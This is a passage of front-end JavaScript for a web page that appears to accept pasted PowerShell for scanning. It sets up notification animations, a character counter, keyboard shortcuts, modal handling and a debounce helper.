            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOut {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
`;

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    // Load saved theme
    loadTheme();
    
    // Add notification CSS
    const style = document.createElement('style');
    style.textContent = notificationCSS;
    document.head.appendChild(style);
    
    // Add input handlers for privacy mode
    const textarea = document.getElementById('powershellInput');
    
    if (textarea) {
        // Normal input mode - no privacy dots
        textarea.addEventListener('input', function(e) {
            realInputValue = e.target.value;
            updateCharCount();
        });
    }
    
    // Initialize character count
    updateCharCount();
    
    // Add enter key handler for quick submit
    if (textarea) {
        textarea.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'Enter') {
                e.preventDefault();
                submitPowerShell();
            }
        });
    }
    
    // Close modal when clicking outside
    const modal = document.getElementById('scanModal');
    if (modal) {
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                closeScanModal();
            }
        });
    }
    
    // Escape key to close modal
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            const modal = document.getElementById('scanModal');
            if (modal && modal.style.display === 'block') {
                closeScanModal();
            }
        }
    });
});

// Performance optimization: Debounce character count updates
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Apply debouncing to character count
const debouncedUpdateCharCount = debounce(updateCharCount, 150);